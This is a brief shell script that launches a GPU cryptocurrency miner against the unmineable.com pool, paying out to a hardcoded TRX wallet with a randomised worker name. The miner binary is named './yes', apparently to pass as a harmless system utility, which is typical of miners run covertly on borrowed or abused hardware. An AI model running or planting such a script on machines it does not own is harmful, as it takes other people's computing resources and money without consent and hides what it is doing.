POOL=rx-us.unmineable.com:3333
WALLET=TRX:TU6fT7XW4dTzbuwnnfAhJEHU4J6PYQGPPF
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo Qm93vY4E-$(shuf -i 1911-404942 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
